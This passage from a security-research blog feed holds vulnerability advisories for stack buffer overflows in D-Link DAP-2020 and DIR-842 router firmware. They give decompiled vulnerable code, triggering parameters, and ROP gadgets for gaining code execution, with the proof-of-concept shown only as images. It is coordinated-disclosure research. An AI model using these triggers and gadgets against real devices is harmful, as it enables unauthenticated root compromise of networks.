+  &lt;li&gt;The following is part of decompiled code of &lt;em&gt;&lt;strong&gt;/usr/www/cgi-bin/webproc&lt;/strong&gt;&lt;/em&gt; binary, the buffer overflow vulnerability was discovered in &lt;em&gt;&lt;strong&gt;main()&lt;/strong&gt;&lt;/em&gt; function (See below)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;// 00401e20 main - /usr/www/cgi-bin/webproc
+int main(void)
+{
+    …[TRUNCATED]…
+    puVar6 = g_pstNetVars;
+    while (ppcVar7 = g_pstWebVars, puVar6 != (undefined4 *)0x0) {
+        if (iVar5 == 0) {
+            __haystack = “?”;
+        }
+        else {
+            __haystack = “&amp;amp;”;
+        }
+      **  iVar2 = sprintf(__s1,”%s%s=%s”,__haystack,*puVar6,puVar6[1]); //BOF ==&amp;gt; 004024a8**
+        puVar6 = (undefined4 *)puVar6[2];
+        __s1 = __s1 + iVar2;
+        iVar5 = iVar5 + 1;
+    }
+    …[TRUNCATED]…
+    while (__haystack = g_stPostInfo._16_4_, ppcVar7 != (char **)0x0) {
+        __haystack = *ppcVar7;
+        iVar2 = strncmp(__haystack,”var:”,4);
+        if ((((iVar2 == 0) &amp;amp;&amp;amp; (iVar2 = strcmp(__haystack,”var:CacheLastData”), iVar2 != 0)) &amp;amp;&amp;amp;
+                (iVar2 = strncmp(__haystack,”var:mod_“,8), iVar2 != 0)) &amp;amp;&amp;amp;
+            ((iVar2 = strncmp(__haystack,”var:sys_“,8), iVar2 != 0 &amp;amp;&amp;amp;
+                (iVar2 = strcmp(__haystack,”var:sessionid”), iVar2 != 0)))) {
+            if (iVar5 == 0) {
+                pcVar4 = “?”;
+            }
+            else {
+                pcVar4 = “&amp;amp;”;
+            }
+            &lt;strong&gt;iVar2 = sprintf(__s1,”%s%s=%s”,pcVar4,__haystack,ppcVar7[1]); //BOF ===&amp;gt; 004025c0&lt;/strong&gt;
+            __s1 = __s1 + iVar2;
+            iVar5 = iVar5 + 1;
+        }
+        ppcVar7 = (char **)ppcVar7[2];
+    }
+    …[TRUNCATED]…
+}&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We were able to build a test environment for this vulnerability (See below). Additionally, many parameters can be used to trigger the Buffer Overflow vulnerability.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/bof.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The application crashed after an attack data was sent where we were able to control &lt;strong&gt;$PC, $S4&lt;/strong&gt;, some registers as well as content on the &lt;strong&gt;heap and stack&lt;/strong&gt; (See below)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/bof1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;More importantly, ASLR is not enabled on physical devices and the stack is executable (See below). We were able to control the memory where it is pointed by the &lt;strong&gt;“$SP”&lt;/strong&gt; register which is executable in the context of the stack segment. &lt;/li&gt;
+  &lt;li&gt;In fact, if we can control the &lt;strong&gt;“$PC”&lt;/strong&gt; register to point to the shell-code in memory, we will be able to achieve Remote Code Execution on the affected device.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/bof2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We managed to use 2 gadgets: “&lt;em&gt;&lt;strong&gt;addiu $a3, $sp, 0x28 ; jalr $t9&lt;/strong&gt;&lt;/em&gt;” and “&lt;em&gt;&lt;strong&gt;move $t9, $a3 ; jalr $t9&lt;/strong&gt;&lt;/em&gt;” in &lt;strong&gt;/lib/libuClibc-0.9.30.so&lt;/strong&gt; (ASLR is disabled) to control &lt;strong&gt;$A3&lt;/strong&gt; point to stack (part of post data), then control &lt;strong&gt;$PC&lt;/strong&gt; point to &lt;strong&gt;$A3&lt;/strong&gt; register (See below)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/bof3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h3 id=&quot;iii-impact&quot;&gt;&lt;em&gt;&lt;strong&gt;III. IMPACT&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;When a memory buffer overflow occurs and data is written outside the buffer, the running program may become unstable, crash or return corrupt information. The overwritten parts of memory may have contained other important data for the running application which is now overwritten and not available to the program anymore. Buffer overflows can even run other (malicious) programs or commands and result in arbitrary code execution&lt;/li&gt;
+  &lt;li&gt;Proof of Concept:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/poc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vi-disclosure-timeline&quot;&gt;&lt;em&gt;&lt;strong&gt;VI. DISCLOSURE TIMELINE&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;2021-03-12 - Vulnerability reported to vendor (through Zero Day Initiative)&lt;/li&gt;
+  &lt;li&gt;2021-08-18 - Coordinated public release of advisory&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Chi Tran</name></author><category term="security-research" /><summary type="html">I. OVERVIEW</summary></entry><entry><title type="html">[ZDI-21-203] D-Link DAP-2020 webproc getpage Stack-based BOF RCE</title><link href="http://localhost:4000/security-research/2021/02/27/zdi-21-203-d-link-dap-2020-webproc-getpage-stack-based-bof-rce.html" rel="alternate" type="text/html" title="[ZDI-21-203] D-Link DAP-2020 webproc getpage Stack-based BOF RCE" /><published>2021-02-27T00:00:00-06:00</published><updated>2021-02-27T00:00:00-06:00</updated><id>http://localhost:4000/security-research/2021/02/27/zdi-21-203-d-link-dap-2020-webproc-getpage-stack-based-bof-rce</id><content type="html" xml:base="http://localhost:4000/security-research/2021/02/27/zdi-21-203-d-link-dap-2020-webproc-getpage-stack-based-bof-rce.html">&lt;h3 id=&quot;i-overview&quot;&gt;&lt;em&gt;&lt;strong&gt;I. OVERVIEW&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Discoverer: Chi Tran &amp;amp; phieulang93 &amp;amp; chung96vn&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Vendor &amp;amp; Product: D-Link&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Version: DAP-2020 A1&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Zero Day Initiative: &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-21-203/&quot;&gt;ZDI-21-203&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CVE Reference: &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27248&quot;&gt;CVE-2021-27248&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;ii-vulnerability-details&quot;&gt;&lt;em&gt;&lt;strong&gt;II. VULNERABILITY DETAILS&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of D-Link DAP-2020 Wi-Fi access points. Authentication is not required to exploit this vulnerability. The specific flaw exists within the processing of CGI scripts. When parsing the getpage parameter, the process does not properly validate the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;After analyzing the DAP-2020 A1 Router, a Stack Buffer-overflow vulnerability was found on mini_httpd service via ‘&lt;strong&gt;var:menu&lt;/strong&gt;’ or ‘&lt;strong&gt;var:page&lt;/strong&gt;’ parameter, which exist in &lt;strong&gt;&lt;em&gt;WEB_GetCgiVars()&lt;/em&gt;&lt;/strong&gt; function in &lt;strong&gt;/usr/www/cgi-bin/webproc&lt;/strong&gt; binary.&lt;/li&gt;
+  &lt;li&gt;The following is part of decompiled code of &lt;strong&gt;/usr/www/cgi-bin/webproc&lt;/strong&gt; binary, the buffer overflow vulnerability was discovered in &lt;strong&gt;&lt;em&gt;WEB_GetCgiVars()&lt;/em&gt;&lt;/strong&gt; function (See below)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;// 00402cf0 WEB_GetCgiVars - /usr/www/cgi-bin/webproc
+int WEB_GetCgiVars(ST_NAME_VAL **ppstCgiVal)
+{
+    …[TRUNCATED]…
+    iVar3 = 0;
+    if (0 &amp;lt; iVar1) {
+        do {
+            kv = local_30;
+            if (local_30 != (char **)0x0) {
+                __s = *local_30;
+                __s1 = strchr(__s,0x3d);
+                value = __s1 + 1;
+                if (__s1 == (char *)0x0) {
+                    OM_ValAppend((char **)ppstCgiVal,__s,(char *)0x0);
+                }
+                else {
+                    *__s1 = ‘\0’;
+                    OM_ValSet(ppstCgiVal,*kv,value);
+                    c = strcmp(*kv,”var:menu”);
+                    if (c == 0) {
+                        strcpy(szMenu,value); // Stack BOF
+                        WEB_Trace(“[zym]szMenu=%s\n”,szMenu);
+                    }
+                    c = strcmp(*kv,”var:page”);
+                    if (c == 0) {
+                        strcpy(page,value); // Stack BOF
+                        WEB_Trace(“[zym]szPage=%s\n”,page);
+                    }
+                }
+                OM_ValDel(&amp;amp;local_30,kv);
+            }
+            iVar3 = iVar3 + 1;
+        } while (iVar3 &amp;lt; iVar1);
+    }
+    free(__s_00);
+    free(__delim);
+    __s1 = My_getenv(“HTTP_COOKIE”);
+    if (__s1 != (char *)0x0) {
+        __s_00 = strstr(__s1,”&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We were able to build a test environment for this vulnerability (See below). Additionally, either “&lt;strong&gt;var:menu&lt;/strong&gt;” or “&lt;strong&gt;var:page&lt;/strong&gt;” parameter can be used to trigger the Buffer Overflow vulnerability.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;images/Screen-Shot-2021-02-26-at-8.29.02-PM.png&quot; alt=&quot;&quot; /&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The application crashed after an attack data was sent where we were able to control &lt;strong&gt;$PC, $A2&lt;/strong&gt;, some registers as well as content on the stack (See below)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/Screen-Shot-2021-02-26-at-8.30.06-PM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;More importantly, ASLR is not enabled on physical devices and the stack is executable (See below). We were able to control the memory where it is pointed by the &lt;strong&gt;“$a2”&lt;/strong&gt; register which is executable in the context of the stack segment. &lt;/li&gt;
+  &lt;li&gt;In fact, if we can control the &lt;strong&gt;“$PC”&lt;/strong&gt; register to point to the shell-code in memory, we will be able to achieve Remote Code Execution on the affected device.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/Screen-Shot-2021-02-26-at-8.31.26-PM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We managed to use gadget “&lt;strong&gt;move $t9, $a2 ; jalr $t9&lt;/strong&gt;” in &lt;strong&gt;/lib/libuClibc-0.9.30.so&lt;/strong&gt; (ASLR is disabled) to control $PC register to point to $a2 register (part of cookie value)(See below)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/Screen-Shot-2021-02-26-at-8.32.33-PM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;iii-impact&quot;&gt;&lt;em&gt;&lt;strong&gt;III. IMPACT&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;When a memory buffer overflow occurs and data is written outside the buffer, the running program may become unstable, crash or return corrupt information. The overwritten parts of memory may have contained other important data for the running application which is now overwritten and not available to the program anymore. Buffer overflows can even run other (malicious) programs or commands and result in arbitrary code execution&lt;/li&gt;
+  &lt;li&gt;Proof of Concept:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/Screen-Shot-2021-02-26-at-8.34.40-PM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vi-disclosure-timeline&quot;&gt;&lt;em&gt;&lt;strong&gt;VI. DISCLOSURE TIMELINE&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;2020-08-21 - Vulnerability reported to vendor (through Zero Day Initiative)&lt;/li&gt;
+  &lt;li&gt;2021-02-24 - Coordinated public release of advisory&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Chi Tran</name></author><category term="security-research" /><summary type="html">I. OVERVIEW</summary></entry><entry><title type="html">[CVE-2020-8962] D-LINK DIR-842 Stack-based Buffer-overflow</title><link href="http://localhost:4000/security-research/2020/02/13/cve-2020-8962-d-link-dir-842-stack-based-buffer-overflow.html" rel="alternate" type="text/html" title="[CVE-2020-8962] D-LINK DIR-842 Stack-based Buffer-overflow" /><published>2020-02-13T00:00:00-06:00</published><updated>2020-02-13T00:00:00-06:00</updated><id>http://localhost:4000/security-research/2020/02/13/cve-2020-8962-d-link-dir-842-stack-based-buffer-overflow</id><content type="html" xml:base="http://localhost:4000/security-research/2020/02/13/cve-2020-8962-d-link-dir-842-stack-based-buffer-overflow.html">&lt;h3 id=&quot;i-overview&quot;&gt;&lt;em&gt;&lt;strong&gt;I. OVERVIEW&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Discoverer: Chi Tran&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Vendor &amp;amp; Product: D-Link&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Version: DIR-842_REVC_RELEASE_NOTES_v3.13B09_HOTFIX&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CVE Reference: CVE-2020-8962&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;ii-about-d-link&quot;&gt;&lt;em&gt;&lt;strong&gt;II. ABOUT D-LINK&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;D-Link’s products are geared towards the networking and communications market. Its business products include switches, surveillance network cameras, firewalls, iSCSI SANs and business wireless, while consumer products cover consumer wireless devices, broadband devices, and the Digital Home devices (which include media players, storage, and surveillance camera/NVR).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;iii-vulnerability-details&quot;&gt;&lt;em&gt;&lt;strong&gt;III. VULNERABILITY DETAILS&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;On December 31, 2019, D-Link released &lt;strong&gt;DIR-842_REVC_RELEASE_NOTES_v3.13B09_HOTFIX&lt;/strong&gt; to fix the hard-coded credential issue (CVE-2019-18852).&lt;/li&gt;
+  &lt;li&gt;By analyzing the firmware using QEMU, I observed that requests to /MTFWU are configured to be handled by &lt;strong&gt;/usr/sbin/mtfwu&lt;/strong&gt; in HTTPD service configuration.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/httpd-config.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Digging into this path, the execution is symlinked by &lt;strong&gt;/htdocs/cgibin&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;images/symlink.png&quot; alt=&quot;&quot; /&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;At this point, I saw the attack surface is around HTTPD service at /MTFWU endpoint. From reversing the firmware (.bin), I was able to determine the &lt;strong&gt;stack buffer overflow&lt;/strong&gt; via &lt;strong&gt;LOGINPASSWORD&lt;/strong&gt; parameter.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/BOF.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Line 19 and 50 indicate where Buffer Overflow occurs when we craft a POST request to /MTFWU with long enough value in LOGINPASSWORD parameters. This would make the service to crash and lead to an RCE as a result.&lt;/li&gt;
+  &lt;li&gt;And it is always good to see these types of emails. Exploit was confirmed and bug got fixed!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/Email-threads-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;iv-impact&quot;&gt;&lt;em&gt;&lt;strong&gt;IV. IMPACT&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;When a memory buffer overflow occurs and data is written outside the buffer, the running program may become unstable, crash or return corrupt information. The overwritten parts of memory may have contained other important data for the running application which is now overwritten and not available to the program anymore. Buffer overflows can even run other (malicious) programs or commands and result in arbitrary code execution&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;v-remediation&quot;&gt;&lt;em&gt;&lt;strong&gt;V. REMEDIATION&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://support.dlink.com/ProductInfo.aspx?m=DIR-842&quot;&gt;https://support.dlink.com/ProductInfo.aspx?m=DIR-842&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;vi-report-timeline&quot;&gt;&lt;em&gt;&lt;strong&gt;VI. REPORT TIMELINE&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;01/14/2020: Discovered the vulnerability&lt;/li&gt;
+  &lt;li&gt;01/15/2020: Responsible disclosure to D-Link security@dlink.com&lt;/li&gt;
+  &lt;li&gt;01/29/2020: Followed up with the previous email since no response&lt;/li&gt;
+  &lt;li&gt;02/03/2020: Followed up by sending a message via D-Link website&lt;/li&gt;
+  &lt;li&gt;02/12/2020: D-Link R&amp;amp;D confirmed the issue and released a HOTFIX for this firmware&lt;/li&gt;
+  &lt;li&gt;02/12/2020: CVE-2020-8962 was assigned to the issue&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;vii-thanks-to&quot;&gt;&lt;em&gt;&lt;strong&gt;VII. THANKS TO&lt;/strong&gt;&lt;/em&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Chung Nguyen&lt;/strong&gt; FOR GIVING FEEDBACK AND COMMENTS UPON EXPLOITATION&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;WILL BROWN&lt;/strong&gt; (D-LINK) FOR PROMPT R&amp;amp;D WORK &amp;amp; UPDATES&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Chi Tran</name></author><category term="security-research" /><summary type="html">I. OVERVIEW</summary></entry></feed>
